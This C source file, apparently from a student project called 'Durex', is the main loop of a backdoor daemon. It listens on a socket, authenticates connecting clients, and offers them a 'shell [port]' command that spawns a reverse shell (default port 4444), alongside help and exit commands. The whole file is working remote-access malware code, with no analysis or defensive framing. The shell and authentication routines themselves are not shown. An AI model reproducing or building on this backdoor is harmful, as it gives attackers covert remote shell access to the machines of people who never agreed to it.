/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex_daemon.c                                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: user42 <user42@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/02/09 12:00:08 by user42            #+#    #+#             */
/*   Updated: 2022/02/15 11:01:47 by user42           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

void	durex_daemon(void)
{
	t_server	server;
	t_client	*tmp;
	int			rc;
	int			ready;

	setup_server(&server);

	while (1)
	{
		ready = poll(server.pfds, server.nfds, -1);
		if (ready < 0)
			continue;
		
		for (int i = 0; i < server.nfds; i++)
		{
			if (server.pfds[i].revents & POLLIN)
			{
				if (server.pfds[i].fd == server.listen_sd)
				{
					add_client(&server);
					break ;
				}

				else
				{
					tmp = get_client_from_fd(&server, server.pfds[i].fd);
					rc = recv(server.pfds[i].fd, server.buff, RECV_SIZE - 1, 0);
					if (rc <= 0)
					{
						shutdown_connection(&server, tmp);
						break ;
					}
					else
					{
						server.buff[rc] = '\0';
						server.buff[strcspn(server.buff, "\n")] = '\0';
						
						if (!tmp->auth)
							authenticate(&server, tmp);
						else
						{
							if (!strcmp(server.buff, "?"))
								send_info(&server, server.pfds[i].fd, "?		show this help\nshell [port]	Spawn reverse shell on specified port (default 4444)\nexit		Close connection\n$> ");
							else if (!strncmp(server.buff, "shell", 5))
								spawn_shell(&server, get_client_from_id(&server, tmp->id));
							else if (!strcmp(server.buff, "exit"))
							{
								send_info(&server, server.pfds[i].fd, "Bye!");
								shutdown_connection(&server, tmp);
								break ;
							}
							else
								send_info(&server, server.pfds[i].fd, "$> ");
						}
					}
				}
			}
		}
	}
}
